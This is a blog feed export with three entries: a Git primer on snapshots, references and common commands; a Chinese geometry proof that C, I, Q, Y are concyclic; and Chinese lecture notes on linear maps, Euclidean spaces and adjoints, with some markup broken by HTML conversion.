        <content type="html"><![CDATA[<h2 id="What-Are-VCSs"><a href="#What-Are-VCSs" class="headerlink" title="What Are VCSs?"></a>What Are VCSs?</h2><p>Version control systems (VCSs) are tools used to track changes to a folder and its contents in a series of snapshots. They also maintain metadata like who created each snapshot, messages associated with each snapshot, and so on.</p><p>While other VCSs exist, <strong>Git</strong> is the de facto standard for version control. </p><h2 id="Data-Model"><a href="#Data-Model" class="headerlink" title="Data Model"></a>Data Model</h2><p>Git has a well-thought-out model that enables maintaining history, supporting branches, and collaboration.</p><h3 id="Snapshots"><a href="#Snapshots" class="headerlink" title="Snapshots"></a>Snapshots</h3><p>Git models the history of a collection of files and folders within some top-level directory as a series of snapshots.</p><ul><li>File — Blob</li><li>Directory — Tree </li><li>Snapshot — The top-level tree being tracked</li></ul><h3 id="History-Relating-snapshots"><a href="#History-Relating-snapshots" class="headerlink" title="History: Relating snapshots"></a>History: Relating snapshots</h3><p>In Git, a history is a directed acyclic graph (DAG) of snapshots. This means that each snapshot in Git refers to a set of “parents”, the snapshots that preceded it. Moreover, a snapshot might descend from multiple parents due to combining (merging) two parallel branches of development.</p><h3 id="Data-model-As-pseudocode"><a href="#Data-model-As-pseudocode" class="headerlink" title="Data model: As pseudocode"></a>Data model: As pseudocode</h3><p>It is instructive to see Git’s data model written down in pseudocode.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">type</span> blob <span class="token operator">=</span> array<span class="token operator">&lt;</span>byte<span class="token operator">&gt;</span><span class="token builtin">type</span> tree <span class="token operator">=</span> <span class="token builtin">map</span><span class="token operator">&lt;</span>string<span class="token punctuation">,</span> tree <span class="token operator">|</span> blob<span class="token operator">&gt;</span><span class="token builtin">type</span> commit <span class="token operator">=</span> struct <span class="token punctuation">{</span>    parents<span class="token punctuation">:</span> array<span class="token operator">&lt;</span>commit<span class="token operator">&gt;</span>    author<span class="token punctuation">:</span> string    message<span class="token punctuation">:</span> string    snapshot<span class="token punctuation">:</span> tree<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Objects-and-Content-Addressing"><a href="#Objects-and-Content-Addressing" class="headerlink" title="Objects and Content-Addressing"></a>Objects and Content-Addressing</h3><p>An “object” is a blob, tree, or commit. In Git data store, all objects are content-addressed by <a href="https://en.wikipedia.org/wiki/SHA-1">SHA-1 hash</a>.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">type</span> <span class="token builtin">object</span> <span class="token operator">=</span> blob <span class="token operator">|</span> tree <span class="token operator">|</span> commitobjects <span class="token operator">=</span> <span class="token builtin">map</span><span class="token operator">&lt;</span>string<span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token operator">&gt;</span><span class="token keyword">def</span> <span class="token function">store</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">id</span> <span class="token operator">=</span> sha1<span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span>    objects<span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">object</span><span class="token keyword">def</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> objects<span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p>Git’s solution is human-readable names for SHA-1 hashes, called “references”. References are mutable pointers to commits. For example, the <code>master</code> reference usually points to the latest commit in the main branch of development. Moreover, “where we currently are” is a special reference called “HEAD”.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">references <span class="token operator">=</span> <span class="token builtin">map</span><span class="token operator">&lt;</span>string<span class="token punctuation">,</span> string<span class="token operator">&gt;</span><span class="token keyword">def</span> <span class="token function">update_reference</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    references<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">id</span><span class="token keyword">def</span> <span class="token function">read_reference</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> references<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">load_reference</span><span class="token punctuation">(</span>name_or_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> name_or_id <span class="token keyword">in</span> references<span class="token punctuation">:</span>        <span class="token keyword">return</span> load<span class="token punctuation">(</span>references<span class="token punctuation">[</span>name_or_id<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> load<span class="token punctuation">(</span>name_or_id<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Repositories"><a href="#Repositories" class="headerlink" title="Repositories"></a>Repositories</h3><p>A Git <em>repository</em> is the data <code>objects</code> and <code>references</code>.</p><h2 id="Staging-Area"><a href="#Staging-Area" class="headerlink" title="Staging Area"></a>Staging Area</h2><p>For example, imagine a scenario where you have debugging print statements added all over your code, along with a bugfix; you want to commit the bugfix while discarding all the print statements.</p><p>Git accommodates such scenarios by allowing you to specify which modifications should be included in the next snapshot through a mechanism called the “staging area”.</p><h2 id="Command-Line-Interface"><a href="#Command-Line-Interface" class="headerlink" title="Command-Line Interface"></a>Command-Line Interface</h2><h3 id="Basics"><a href="#Basics" class="headerlink" title="Basics"></a>Basics</h3><ul><li><code>git help &lt;command&gt;</code>: get help for a command</li><li><code>git init</code>: create a new git repo with data stored in the <code>.git</code> directory</li><li><code>git status</code>: tell what is going on</li><li><code>git add &lt;filename&gt;</code>: add files to staging area</li><li><code>git commit</code>: create a new commit<ul><li>Write <a href="https://tbaggery.com/2008/04/19/a-note-about-git-commit-messages.html">good commit messages</a>!</li><li>More reasons to write <a href="https://chris.beams.io/posts/git-commit/">good commit messages</a>!</li></ul></li><li><code>git log</code>: show a flattened log of history</li><li><code>git log --all --graph --decorate</code>: visualizes history as a DAG</li><li><code>git diff &lt;filename&gt;</code>: show changes made to the staging area</li><li><code>git diff &lt;revision&gt; &lt;filename&gt;</code>: show differences in a file between snapshots</li><li><code>git checkout &lt;revision&gt;</code>: update HEAD and current branch</li></ul><h3 id="Branching-and-Merging"><a href="#Branching-and-Merging" class="headerlink" title="Branching and Merging"></a>Branching and Merging</h3><ul><li><code>git branch</code>: show branches</li><li><code>git branch &lt;name&gt;</code>: create a branch</li><li><code>git checkout -b &lt;name&gt;</code>: create a branch and switch to it</li><li><code>git merge &lt;revision&gt;</code>: merge into current branch</li><li><code>git mergetool</code>: use a fancy tool to help resolve merge conflicts</li><li><code>git rebase</code>: rebase set of patches onto a new base</li></ul><h3 id="Remotes"><a href="#Remotes" class="headerlink" title="Remotes"></a>Remotes</h3><ul><li><code>git remote</code>: list remotes</li><li><code>git remote add &lt;name&gt; &lt;url&gt;</code>: add a remote</li><li><code>git push &lt;remote&gt; &lt;local branch&gt;:&lt;remote branch&gt;</code>: send objects to remote and update remote reference</li><li><code>git branch --set-upstream-to=&lt;remote&gt;/&lt;remote branch&gt;</code>: set up correspondence between local and remote branch</li><li><code>git fetch</code>: retrieve objects/references from a remote</li><li><code>git pull</code>: same as <code>git fetch; git merge</code></li><li><code>git clone</code>: download repository from remote</li></ul><h3 id="Undo"><a href="#Undo" class="headerlink" title="Undo"></a>Undo</h3><ul><li><code>git config</code>: Git is <a href="https://git-scm.com/docs/git-config">highly customizable</a></li><li><code>git clone --depth=1</code>: shallow clone, without entire version history</li><li><code>git add -p</code>: interactive staging</li><li><code>git rebase -i</code>: interactive rebasing</li><li><code>git blame</code>: show who last edited which line</li><li><code>git stash</code>: temporarily remove modifications to working directory</li><li><code>git bisect</code>: binary search history</li><li><code>.gitignore</code>: <a href="https://git-scm.com/docs/gitignore">specify</a> intentionally untracked files to ignore</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>几何一窥</title>
      <link href="/2022/09/19/ji-he-yi-kui-09-19/"/>
      <url>/2022/09/19/ji-he-yi-kui-09-19/</url>
      
        <content type="html"><![CDATA[<p><strong>Problem:</strong></p><p>$I$是$\triangle ABC$内心, $P, Q$是$I$在$AB, AC$上的投影, 直线$PQ$交$\triangle ABC$的外接圆于$X, Y$两点, $B, I, P, X$共圆. 求证: $C, I, Q, Y$四点共圆.</p><p><strong>Proof:</strong></p><p>由$\angle API=\angle AQI=90^\circ$, 得$A, P, I, Q$四点共圆.</p><p>故<script type="math/tex">\angle BIX+\angle BIC=\angle BPX+90^\circ + \frac{1}{2}\angle BAC=180^\circ.</script></p><p>即$C, I, X$三点共线. 又因为$B, I, P, X$四点共圆, </p><p>知$\angle BXI=\angle BPI=90^\circ$, 即$BX\perp CX$, $BC$为$\odot ABC$的直径, $AB\perp AC$.</p><p>从而四边形$APIQ$为正方形. 取弧$\mathop{AC}\limits^{\frown}$中点$Z$, 由鸡爪定理知$ZA=ZI=ZC$成立.</p><p>从而点$Z$位于线段$AI$的垂直平分线上. 又正方形$APIQ$中, $PQ$垂直平分$AI$,</p><p>故点$Z$位于直线$PQ$上, $P, Q, Z$三点共线. 又显然点$Z$与点$X$不重合,</p><p>故点$Z$与点$Y$重合, $Y$为弧$\mathop{AC}\limits^{\frown}$中点. </p><p>由鸡爪定理知$B, I, Y$三点共线. </p><p>进而$\angle IYC=\angle BYC=90^\circ=\angle IQC$, </p><p>即$C, I, Q, Y$四点共圆.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301948300.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Geometry </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高等代数选讲</title>
      <link href="/2022/09/16/gao-deng-dai-shu-xuan-jiang/"/>
      <url>/2022/09/16/gao-deng-dai-shu-xuan-jiang/</url>
      
        <content type="html"><![CDATA[<h2 id="Chapter-1-抽象线性空间理论"><a href="#Chapter-1-抽象线性空间理论" class="headerlink" title="Chapter 1 抽象线性空间理论"></a>Chapter 1 抽象线性空间理论</h2><h3 id="Definition-1"><a href="#Definition-1" class="headerlink" title="Definition 1"></a>Definition 1</h3><ul><li>给定线性空间 $\mathcal{U, V}$, 用 $\mathcal{Hom}_{\mathbb{F}}\mathcal{(U, V)}$ 表示从 $\mathcal{U}$ 到 $\mathcal{V}$ 的线性映射的全体.  </li><li>容易验证 $\mathcal{Hom}_{\mathbb{F}}\mathcal{(U, V)}$ 同时也是 $\mathbb{F}$ 上的线性空间.</li></ul><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h3><ul><li>$\mathcal{Hom}_{\mathbb{R}}(\mathbb{R}^n, \mathbb{R}^m)$ 表示全体 $m\times n$ 矩阵.</li></ul><h3 id="Property-1"><a href="#Property-1" class="headerlink" title="Property 1"></a>Property 1</h3><ul><li>对 $f\in\mathcal{Hom}_{\mathbb{F}}\mathcal{(U, V)}, g\in\mathcal{Hom}_{\mathbb{F}}\mathcal{(V, W)}$, 有 $g\circ f\in\mathcal{Hom}_{\mathbb{F}}\mathcal{(U, W)}$.</li></ul><h3 id="Definition-2"><a href="#Definition-2" class="headerlink" title="Definition 2"></a>Definition 2</h3><ul><li>给定线性空间 $\mathcal{U, V}$, 若存在线性双射 $f:\mathcal{U}\rightarrow\mathcal{V}$, 则称 $\mathcal{U, V}$ 线性同构, 同构定义了一种等价关系.</li></ul><h3 id="Question-1"><a href="#Question-1" class="headerlink" title="Question 1"></a>Question 1</h3><ul><li>如何考虑以同构为基础的线性空间分类?</li><li>对 $n$ 维线性空间 $\mathcal{V}/\mathbb{F}$ 的一组基为 $e_1, \dots, e_n$, 考虑映射 $\sigma_{e_1,\dots, e_n}:\mathcal{V}\rightarrow\mathbb{F}^n, x\rightarrow (x_1, \dots, x_n)^T$.<ul><li>其中 $x=\sum_{i=1}^n{x_ie_i}=(e_1, \dots, e_n)(x_1, \dots, x_n)^T$, 此时 $\sigma_{e_1,\dots, e_n}$ 为 $\mathbb{F}$ 上的线性同构.</li></ul></li></ul><h3 id="Definition-3"><a href="#Definition-3" class="headerlink" title="Definition 3"></a>Definition 3</h3><ul><li>对于 $n$ 维线性空间 $\mathcal{V}$ 的两组基 $(e_1, \dots, e_n)$ 与 $(t_1, \dots, t_n)$,<br>$(t_1, \dots, t_n)=(e_1, \dots, e_n)\left( \begin{matrix}<br>t_{11}&amp;        \cdots&amp;        t_{1n}\\<br>\vdots&amp;        &amp;        \vdots\\<br>t_{n1}&amp;        \cdots&amp;        t_{nn}\\<br>\end{matrix} \right)  =(e_1, \dots, e_n)T$, 称 $T$ 为过渡矩阵.</li><li>对$\forall x\in\mathcal{V}$, <ul><li>若 $x=(e_1, \dots, e_n)(x_1, \dots, x_n)^T=(t_1, \dots, t_n)(y_1, \dots, y_n)^T$,<br>那么有 $(x_1, \dots, x_n)^T=T(y_1, \dots, y_n)^T$, 这是由基的表示法的唯一性所决定的.</li></ul></li></ul><h3 id="Definition-4"><a href="#Definition-4" class="headerlink" title="Definition 4"></a>Definition 4</h3><ul><li>$n$ 维线性空间 $\mathcal{U}/\mathbb{F}$, 其上一组基为 $(e_1, \dots, e_n)$; </li><li>$m$ 维线性空间 $\mathcal{V}/\mathbb{F}$, 其上一组基为 $(i_1, \dots, i_m)$. </li><li>考虑从 $\mathcal{U}$ 到 $\mathcal{V}$ 的线性映射 $f$:<ul><li>由 $f(e_1)=(i_1, \dots, i_m)(F(\vec{e_1}))$, 进而有</li><li>$(f(e_1), \dots, f(e_n))=(i_1, \dots, i_m)(F(\vec{e_1}), \dots, F(\vec{e_n}))=(i_1, \dots, i_m)F$.</li></ul></li><li>称 $F$ 为基 $e_1,\dots, e_n, i_1, \dots, i_m$ 下的表示矩阵.</li></ul><h3 id="Tip-1"><a href="#Tip-1" class="headerlink" title="Tip 1"></a>Tip 1</h3><ul><li>$\mathcal{Hom}_{\mathbb{F}}\mathcal{(U, V)}\xrightarrow{\sigma_{e_1,\dots, e_n, i_1, \dots, i_m}}\mathbb{F}^{m\times n}$ 是一个同构映射.</li></ul><h3 id="Tip-2"><a href="#Tip-2" class="headerlink" title="Tip 2"></a>Tip 2</h3><ul><li>表示矩阵相乘表示基底相传递.</li></ul><h3 id="Question-2"><a href="#Question-2" class="headerlink" title="Question 2"></a>Question 2</h3><ul><li>线性映射在不同基下的表示矩阵如何变化?<ul><li>$\mathcal{U}:(t_1, \dots, t_n)=(e_1, \dots, e_n)T$,</li><li>$\mathcal{V}:(s_1, \dots, s_m)=(i_1, \dots, i_m)S$,</li><li>线性映射 $f:\mathcal{U}\rightarrow\mathcal{V}$.</li></ul></li><li>记 $\sigma_{e_1,\dots, e_n, i_1, \dots, i_m}(f) = F$, 则 $\sigma_{t_1,\dots, t_n, s_1, \dots, s_m}(f) = S^{-1}FT$.</li></ul><h3 id="Tip-3"><a href="#Tip-3" class="headerlink" title="Tip 3"></a>Tip 3</h3><ul><li>$\mathcal{U}:(q_1, \dots, q_n)=(e_1, \dots, e_n)Q$,<ul><li>其中 $(q_1, \dots, q_n), (e_1, \dots, e_n)$ 是 $\mathcal{U}$ 的两组标准正交基,</li><li>线性映射 $f:\mathcal{U}\rightarrow\mathcal{U}$.</li></ul></li><li>记 $\sigma_{e_1,\dots, e_n}(f) = F$, 则 $\sigma_{q_1,\dots, q_n}(f) = Q^{-1}FQ = Q^TFQ$.</li><li>这也就是说：<ul><li>$n$ 阶方阵 $A, B$ 正交相似 $\Longleftrightarrow A, B$ 是 $n$ 维线性空间某个线性变换在两组标准正交基下的矩阵.</li></ul></li></ul><h2 id="Chapter-2-欧氏空间"><a href="#Chapter-2-欧氏空间" class="headerlink" title="Chapter 2 欧氏空间"></a>Chapter 2 欧氏空间</h2><h3 id="Definition-1-1"><a href="#Definition-1-1" class="headerlink" title="Definition 1"></a>Definition 1</h3><ul><li>给定线性空间 $\mathcal{V}/\mathbb{R}$, $\left&lt;\cdot, \cdot\right&gt;:\mathcal{V}\times\mathcal{V}\rightarrow\mathbb{R}$, 满足 $\forall a,b\in\mathcal{V}$, 有<ul><li>$a)$ 对称性: $\left<a, b\right=""> = \left<b, a\right="">$;</b,></a,></li><li>$b)$ 双线性性: $\left<k_1a_1+k_2a_2, b\right=""> = k_1\left<a_1, b\right=""> + k_2\left<a_2, b\right="">$;</a_2,></a_1,></k_1a_1+k_2a_2,></li><li>$c)$ 正定性: $\left<a, a\right=""> \ge 0$, 取等当且仅当 $a = 0$.</a,></li></ul></li><li>则称二元函数是 $\mathcal{V}$ 上的一个内积, 具有内积的线性空间称为一个实内积空间,或欧氏空间.</li></ul><h3 id="Example-1-1"><a href="#Example-1-1" class="headerlink" title="Example 1"></a>Example 1</h3><ul><li>$\mathbb{R}^n\quad \left<a, b\right=""> = a^Tb$ 是 $\mathbb{R}^n$上的标准内积. </a,></li><li>现在考虑一般的情况 $\left<a, b\right=""> = a^TAb$, 其中 $A\in\mathbb{R}^{n\times n}$. <ul><li>为了满足对称性 $\left<a, b\right=""> = a^TAb = \left<b, a\right=""> =  b^TAa = a^TA^Tb$, 需要 $A$ 对称;</b,></a,></li><li>为了满足正定性 $\left<a, a\right=""> = a^TAa \ge 0$, 需要 $A$ 正定; </a,></li></ul></a,></li><li>此时双线性性是显然满足的; </li><li>所以只要 $A$ 对称正定, $\mathbb{R}^n$ 上的二元函数 $\left(a, b\right)\rightarrow a^TAb$ 是内积.</li></ul><h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h3><ul><li>$\mathbb{R}^{m\times n}\quad \left<a, b\right=""> = trace(B^TA)$ 是 $\mathbb{R}^{m\times n}$ 上的标准内积. </a,></li></ul><h3 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3"></a>Example 3</h3><ul><li>$\mathcal{C}\left[a, b\right]\quad \left<f, g\right=""> = \int_a^b{f\left( x \right) g\left( x \right) dx}$ 是 $\mathcal{C}\left[a, b\right]$ 上的标准内积.</f,></li></ul><h3 id="Definition-2-1"><a href="#Definition-2-1" class="headerlink" title="Definition 2"></a>Definition 2</h3><ul><li>定义向量的长度 $\left| a \right|=\sqrt{\left<a,a\right>}$, 对 $a\in\mathcal{V}$;</a,a\right></li><li>定义向量间的距离为 $\left| a-b \right|$, 对 $a, b\in\mathcal{V}$.</li></ul><h3 id="Property-1-1"><a href="#Property-1-1" class="headerlink" title="Property 1"></a>Property 1</h3><ul><li><p>$(Cauchy-Schwarz\ Inequality)$</p><p>$\left| \left&lt; a, b \right&gt; \right|$ ≤ $\left| a \right| \cdot \left| b \right| $.</p></li></ul><h3 id="Property-2"><a href="#Property-2" class="headerlink" title="Property 2"></a>Property 2</h3><ul><li><p>$(Triangular\ Inequality)$</p><p>$\left| a+b \right|$ ≤ $\left| a \right| + \left| b \right| $.</p></li></ul><h3 id="Definition-3-1"><a href="#Definition-3-1" class="headerlink" title="Definition 3"></a>Definition 3</h3><ul><li>在 $n$ 维欧氏空间 $\mathcal{V}$ 中, 由 $n$ 个向量组成的正交向量组称为 $\mathcal{V}$ 的一组正交基.</li><li>特别地,当这 $n$ 个向量均为单位向量时,称它们构成欧氏空间 $\mathcal{V}$ 的一组标准正交基.</li></ul><h3 id="Question-1-1"><a href="#Question-1-1" class="headerlink" title="Question 1"></a>Question 1</h3><ul><li>$\mathbb{R}^{m\times n}$上的一组标准正交基是什么?</li><li>是 $E_{ij}(1 \le i \le m, 1 \le j \le n)$, 其中 $E_{ij}$ 表示第 $i$ 行, 第 $j$ 列元素为1, 其余元素均为0的 $m\times n$ 矩阵.</li></ul><h3 id="Question-2-1"><a href="#Question-2-1" class="headerlink" title="Question 2"></a>Question 2</h3><ul><li>$Gram Schmidt$ 正交化方法如何推广到欧氏空间?</li><li>$(a_1, \dots, a_r) = (q_1, \dots, q_r)R$, $R$ 为上三角阵.</li></ul><h3 id="Example-4"><a href="#Example-4" class="headerlink" title="Example 4"></a>Example 4</h3><ul><li>定义 $\left<f, g\right=""> = \int_{-1}^{1}{f\left( x \right) g\left( x \right) dx}$ 是 $\mathbb{R}\left[x\right]$ 上的标准内积, </f,></li><li>对 $1, x, x^2, \dots$ 这组基进行 $Gram Schmidt$ 正交化(这里 $\mathbb{R}\left[x\right]$ 指实数域 $\mathbb{R}$ 上的多项式空间).</li><li>这里不妨考虑简单情形, 对 $q_1=1, q_2=x, q_3=x^2$ 进行 $Gram Schmidt$ 正交化, 得到 $\tilde{q}_1=1, \tilde{q}_2=x, \tilde{q}_3=x^2 - \frac{1}{3}$.</li></ul><h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><ul><li>基扩充定理可以直接推广至欧氏空间, i.e.有限维欧氏空间中任意正交向量组可以扩充为一组相应的正交基.</li></ul><h3 id="Question-3"><a href="#Question-3" class="headerlink" title="Question 3"></a>Question 3</h3><ul><li>如何利用坐标计算内积?</li><li>欧氏空间 $\mathcal{V}$ 一组基底为 $a_1,a_2,\dots,a_n$, $x,y\in\mathcal{V}$, 在这组基下的坐标分别为 $(x_1,\dots,x_n)^T, (y_1,\dots,y_n)^T$,<ul><li>$\left<x, y\right=""> = \left&lt;\sum_{i = 1}^n{a_ix_i}, \sum_{j = 1}^n{a_jy_j}\right&gt; =<br>\sum_{i = 1}^n\sum_{j = 1}^n x_iy_j\left<a_i, a_j\right=""> = {\hat{x}}^TG\hat{y},$</a_i,></x,></li></ul></li><li>其中 $G$ 称为内积在基 $a_1,a_2,\dots,a_n$ 下的 $Gram$ 矩阵, $\hat{x}$, $\hat{y}$ 称为 $x, y$ 在这组基下的坐标.</li></ul><h3 id="Question-4"><a href="#Question-4" class="headerlink" title="Question 4"></a>Question 4</h3><ul><li>当基改变时, 度量矩阵如何改变?<ul><li>$x = (e_1, \dots, e_n)\hat{x} = (t_1, \dots, t_n)\tilde{x}$,</li><li>$y = (e_1, \dots, e_n)\hat{y} = (t_1, \dots, t_n)\tilde{y}$,</li></ul></li><li>设内积在基 $(e_1, \dots, e_n)$ 下的 $Gram$ 矩阵为 $G$, 在基 $(t_1, \dots, t_n)$ 下的 $Gram$ 矩阵为 $\tilde{G}$, 容易得到</li></ul><script type="math/tex; mode=display">\begin{aligned}\tilde{x}^T\tilde{G}\tilde{y} &= \left<(t_1, \dots, t_n)\tilde{x}, (t_1, \dots, t_n)\tilde{y}\right> \\                      &= \left<(e_1, \dots, e_n)\hat{x}, (e_1, \dots, e_n)\hat{y}\right> \\                      &= \left<(e_1, \dots, e_n)(T\tilde{x}), (e_1, \dots, e_n)(T\tilde{y})\right> \\                      &= (T\tilde{x})^TG(T\tilde{y}) \\                      &= \tilde{x}^T(T^TGT)\tilde{y}\end{aligned}, \forall\tilde{x}, \tilde{y},</script><ul><li>其中 $(t_1, \dots, t_n) = (e_1, \dots, e_n)T$.</li></ul><h3 id="Property-3"><a href="#Property-3" class="headerlink" title="Property 3"></a>Property 3</h3><ul><li>$\mathcal{V}$ 为欧氏空间, $\left(e_1, \dots, e_n\right)$ 为标准正交基, $T$ 为 $n$ 阶方阵, $(t_1, \dots, t_n) = (e_1, \dots, e_n) T$, 则<ul><li>$(t_1, \dots, t_n)$ 为一组标准正交基 $\Longleftrightarrow T$ 是正交阵.</li></ul></li></ul><h3 id="Definition-4-1"><a href="#Definition-4-1" class="headerlink" title="Definition 4"></a>Definition 4</h3><ul><li>对欧氏空间 $\mathcal{V}$ 与 $\mathcal{U}$, 如果 $\mathcal{U}\subset\mathcal{V}$, 则称 $\mathcal{U}$ 为 $\mathcal{V}$ 的子空间.</li></ul><h3 id="Definition-5"><a href="#Definition-5" class="headerlink" title="Definition 5"></a>Definition 5</h3><ul><li>$\mathcal{M}$ 是欧氏空间 $\mathcal{V}$ 的子欧氏空间, 称 ${\mathcal{M}}^{\bot} = \left\{a \in \mathcal{V} \mid \left<a, b\right=""> = 0, \forall b \in \mathcal{V}\right\}$ 为其正交补.</a,></li></ul><h3 id="Property-4"><a href="#Property-4" class="headerlink" title="Property 4"></a>Property 4</h3><ul><li>$\mathcal{M}^{\bot}$ 是欧氏空间 $\mathcal{V}$ 的子空间.</li></ul><h3 id="Question-5"><a href="#Question-5" class="headerlink" title="Question 5"></a>Question 5</h3><ul><li>$\mathcal{M, N}$ 是 $\mathcal{V}$ 的子空间, 是否存在同时包含 $\mathcal{M, N}$ 的属于 $\mathcal{V}$ 的最小子空间?</li><li>考虑 $\left\{m + n\mid m\in\mathcal{M}, n\in\mathcal{N}\right\}$, 称为 $M$ 和 $N$ 的和, 记作 $\mathcal{M}+\mathcal{N}$, 它满足所需要求.</li></ul><h3 id="Property-5"><a href="#Property-5" class="headerlink" title="Property 5"></a>Property 5</h3><ul><li><script type="math/tex; mode=display">\begin{equation}\mathcal{M}\cap \mathcal{M}^{\bot} = \varnothing\end{equation}</script></li></ul><script type="math/tex; mode=display">\begin{equation}\mathcal{M} + \mathcal{M}^{\bot} = \mathcal{V}\end{equation}</script><ul><li>设 $\mathcal{M}$ 的一组正交基为 $q_1, \dots, q_r$, 根据基扩充定理, 可扩充 $q_{r+1}, \dots, q_n$,<br>使得 $(q_1, q_2, \dots, q_n)$ 构成 $\mathcal{V}$ 的一组正交基, 那么 ${\mathcal{M}}^{\bot}$ 的一组正交基即为 $q_{r+1}, \dots, q_n$.</li></ul><h3 id="Property-6"><a href="#Property-6" class="headerlink" title="Property 6"></a>Property 6</h3><ul><li>$dim(\mathcal{M})+dim(\mathcal{M}^{\bot})=dim(\mathcal{V})$.</li><li>$(\mathcal{M}^{\bot})^{\bot} = \mathcal{M}$.</li></ul><h2 id="Chapter-3-欧氏空间上的线性映射"><a href="#Chapter-3-欧氏空间上的线性映射" class="headerlink" title="Chapter 3 欧氏空间上的线性映射"></a>Chapter 3 欧氏空间上的线性映射</h2><h3 id="Definition-1-2"><a href="#Definition-1-2" class="headerlink" title="Definition 1"></a>Definition 1</h3><ul><li>给定欧氏空间 $\left(\mathcal{U}, \left&lt; \cdot, \cdot\right&gt;_{\mathcal{U}}\right)$, $\left(\mathcal{V}, \left&lt; \cdot, \cdot\right&gt;_{\mathcal{V}}\right)$, $f\in\mathscr{Hom}\mathcal{(U, V)}, g\in\mathscr{Hom}\mathcal{(V, U)}$,</li><li>使得 $\forall x\in\mathcal{U},y\in\mathcal{V}$, 有<script type="math/tex">\left<f(x),y\right>_{\mathcal{V}}=\left<x,g(y)\right>_{\mathcal{U}},</script><br>则称 $g$ 为 $f$ 的共轭映射或伴随映射, $g=f^*$.</li></ul><h3 id="Property-1-2"><a href="#Property-1-2" class="headerlink" title="Property 1"></a>Property 1</h3><ul><li>$\left(f^<em>\right)^</em>=f$.<ul><li>$\forall x\in\mathcal{U},y\in\mathcal{V}$,<br>有 $\left&lt;(f^<em>)^</em>(x),y\right&gt;_{\mathcal{V}}=\left<y,(f^*)^*(x)\right>_{\mathcal{V}}=\left<f^*(y),x\right>_{\mathcal{U}}=\left<x,f^*(y)\right>_{\mathcal{U}}=\left<f(x),y\right>_{\mathcal{V}}$,<br>从而 $\left&lt;(f^<em>)^</em>(x)-f(x),y\right&gt;_{\mathcal{V}}=0$, $\forall x\in\mathcal{U},y\in\mathcal{V}$.<br>故 $(f^<em>)^</em>(x)-f(x)=0$, $\forall x\in\mathcal{U}$.<br>进而有 $\left(f^<em>\right)^</em>=f$ 成立.</f(x),y\right></x,f^*(y)\right></f^*(y),x\right></y,(f^*)^*(x)\right></li></ul></li></ul><h3 id="Property-2-1"><a href="#Property-2-1" class="headerlink" title="Property 2"></a>Property 2</h3><ul><li>$(g\circ f)^<em>=f^</em>\circ g^*$.</li></ul><h3 id="Question-1-2"><a href="#Question-1-2" class="headerlink" title="Question 1"></a>Question 1</h3><ul><li>如何从矩阵的角度理解伴随映射? <ul><li>$1)$ 基本情形: 考虑 $\mathcal{U}=\mathbb{R}^n, \mathcal{V}=\mathbb{R}^m$ 及其上的标准内积,<script type="math/tex; mode=display">f\in\mathcal{Hom}\mathcal{(U, V)}\xrightarrow{\quad\quad\quad\quad}A\in\mathbb{R}^{m\times n}, x\rightarrow Ax, x\in\mathbb{R}^n;</script><script type="math/tex; mode=display">f^*\in\mathcal{Hom}\mathcal{(V, U)}\xrightarrow{\quad\quad\quad\quad}B\in\mathbb{R}^{n\times m}, y\rightarrow By, y\in\mathbb{R}^n.</script>$\forall x\in\mathbb{R}^n, y\in\mathbb{R}^m$,<br>有 $y^TAx=\left<ax,y\right>=\left<f(x),y\right>=\left<x,f^*(y)\right>=\left<x,by\right>=y^TB^Tx$,<br>进而 $A=B^T$ 成立.</x,by\right></x,f^*(y)\right></f(x),y\right></ax,y\right></li><li>$2)$ 一般情形: 假定 $\mathcal{U},\mathcal{V}$ 的一组标准正交基分别为<script type="math/tex; mode=display">u_1, u_2, \dots, u_n, v_1, v_2, \dots, v_m.</script>考虑 $\left&lt;(f(u_i),v_j\right&gt;_{\mathcal{V}}=\left<u_i, f^*(v_j)\right="">_{\mathcal{U}}, \forall 1\le i\le n, 1\le j\le m$.<br>其中:<br>$LHS=\left&lt;(v_1, 